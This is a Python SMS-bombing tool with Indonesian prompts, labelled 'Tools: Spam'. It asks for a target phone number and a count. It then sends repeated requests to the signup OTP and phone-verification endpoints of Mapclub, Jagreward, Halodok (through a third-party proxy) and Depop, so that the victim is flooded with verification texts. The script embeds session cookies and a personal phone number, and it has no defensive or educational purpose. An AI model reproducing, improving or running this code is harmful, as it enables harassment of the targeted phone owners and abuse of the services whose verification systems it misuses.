import json,requests,os,sys,time

r = '\033[1;31m'
g = '\033[1;32m'
y = '\033[1;33m'
b = '\033[1;34m'
p = '\033[1;35m'
c = '\033[1;36m'
w = '\033[1;37m'
x = '1'

def lagi():
    time.sleep(3)
    print(y+'')
    z = input(" Lagi? [y/t] : ")
    if z=="y":
        play()
    else:
        print(" Terima kasih telah menggunakan tools ini")

def instagram():
    os.system('clear')
    print(p+" NOMER GUA BREK 0896 1839 9729")
    os.system('0896 1839 9729')
    time.sleep(5)

def banner():
    print (w+" [+]------------------------------------[+]")
    print (w+"  |"+r+"      Author   :    x POIY            "+w+"|")
    print (w+"  |"+p+"      NENE GRUP D :     "+w+"|")
    print (w+"  |"+p+"      Tools    : Spam                "+w+" |")
    print (w+" [+]------------------------------------[+]")

def play():
    print(w+'')
    os.system('clear')
    os.system('\nfiglet SPAM')
    print('')
    banner()
    print('')
    print(w+' Pilih mode : ')
    print('                 [+]--------[+]')
    print(c+' [1]'+y+' Mapclub  '+w+'    | '+g+'[√]WORK  '+w+'|')
    print(c+' [2]'+y+' Jagreward'+w+'    | '+g+'[√]WORK  '+w+'|')
    print(c+' [3]'+y+' Halodok  '+w+'    | '+g+'[√]WORK  '+w+'|')
    print(c+' [4]'+y+' Depop    '+w+'    | '+r+'[X]ERROR '+w+'|')
    print(w+'                 [+]--------[+]')
    print('')
    print(p+' [0]'+r+' Exit')
    print(w+'')
    pilih = input(' Masukan modemu : ')
    if(pilih=="1"):
         mapclub()
    elif(pilih=="2"):
         jagreward()
    elif(pilih=="3"):
         halodok()
    elif(pilih=="4"):
         depop()
    else:
         print(r+' Pilih yang bener!')

def mapclub():
    os.system('clear')
    os.system('figlet MAPCLUB')
    banner()
    print(y+'')
    target = input(' Masukan nomor  : ')
    jumlah = input(' Masukan jumlah [Maks : 10] : ')

    headers = {
    "User-Agent": "Mozilla/5.0 (linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Host": "cmsapi.mapclub.com",
    }

    dat = {
    'phone': target,
    }

    for x in range(int(jumlah)):
	    emwe = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=headers, json=dat)
	    if 'error' in emwe:
		      print(r+(f' [{x+1}] Spam SMS ke '+target+' gagal'))
		      
	    else:
		      print(g+(f' [{x+1}] Spam SMS ke '+target+' berhasil'))
    
    lagi()

def exit():
    print(y+'')
    print(' Terima kasih sudah menggunakan tools ini')
    os.system('exit')

def halodok():
    os.system('clear')
    os.system('figlet HALODOK')
    banner()
    print(y+'')
    target = input(' Masukan nomor  : ')
    jumlah = input(' Masukan jumlah : ')

    for x in range(int(jumlah)):
            try:
                    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
                            data={"number":target})
                    if req.json()['status'] == 'ok':
                            print(g+(f" [{x+1}] Spam SMS ke {target} berhasil"))
			    
                    else:
                            print(r+(f" [{x+1}] Spam SMS ke {target} gagal"))
			    
            except Exception as e:
                    print(f"{x+1}. Pass: {e}")
    
    lagi()

def jagreward():
    os.system('clear')
    os.system('figlet JAGREWARD')
    banner()
    print(y+'')
    target = input(' Masukan nomor  : ')

    ua = {
    "Host":"id.jagreward.com",
    "Connection":"keep-alive",
    "sec-ch-ua":"Google Chrome;v=89, Chromium;v=89, ;Not A Brand;v=99",
    "Accept":"*/*",
    "X-Requested-With":"XMLHttpRequest",
    "sec-ch-ua-mobile":"?1",
    "Save-Data":"on",
    "User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Sec-Fetch-Site":"same-origin",
    "Sec-Fetch-Mode":"cors",
    "Sec-Fetch-Dest":"empty",
    "Referer":"https://id.jagreward.com/en/member/register/",
    "Accept-Encoding":"gzip, deflate, br",
    "Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie":"PHPSESSID=vt4v0skoq1vhkecofjok7aasd5; DAPROPS=sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:2|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0; _ga=GA1.3.429238641.1618112209; _gid=GA1.3.1415882130.1618112209",
    }
    url = f"https://id.jagreward.com/member/verify-mobile/{target}/"
    req = requests.get(url,headers=ua).text
    emwe = json.loads(req)
    print(g+" Spam SMS ke "+target+" berhasil")
    
    lagi()

def depop():
    os.system('clear')
    os.system('figlet DEPOP')
    banner()
    print(y+'')
    target = input(' Masukan nomor  : ')
    jumlah = input(' Masukan jumlah [Maks : 3] : ')

    headers = {
    "Host": "webapi.depop.com",
    "content-length": "50",
    "sec-ch-ua": "Google Chrome;v=89, Chromium;v=89, ;Not A Brand;v=99",
    "accept": "application/json, text/plain, */*",
    "sec-ch-ua-mobile": "?1",
    "save-data": "on",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "x-px-cookie": "eyJ1IjoiNTZjZjk4OTAtOTYxNC0xMWViLTliNmUtMzlhZDgxNzUwZWYyIiwidiI6IjcyZmJjNDM5LThiYmQtMTFlYi04MGEyLTAyNDJhYzEyMDAwZCIsInQiOjE2MTc2MzA1MTAzNzIsImgiOiIwNWM3NTExNzQ2NjIxN2JjY2M2MzQ2NjJhMzM4NmYyMDliY2JlZGUxNGRhYjBkMjljODJlNDBhYjVlNjljYzUyIn0",
    "content-type": "application/json",
    "origin": "https://signup.depop.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://signup.depop.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    data = {
    "phone_number": target,
    "country_code": "ID",
    }
    respon=requests.put("https://webapi.depop.com/api/v1/auth/verify/phone",headers=headers,json=data)
    emwe = json.loads(respon.text)
    if emwe['is_verified']==False:
        print(g+(f" [{x+1}] Spam SMS ke "+target+" berhasil"))
    else:
        print(r+(f" [{x+1}] Spam SMS ke "+target+" gagal"))
    
    lagi()




instagram()
play()
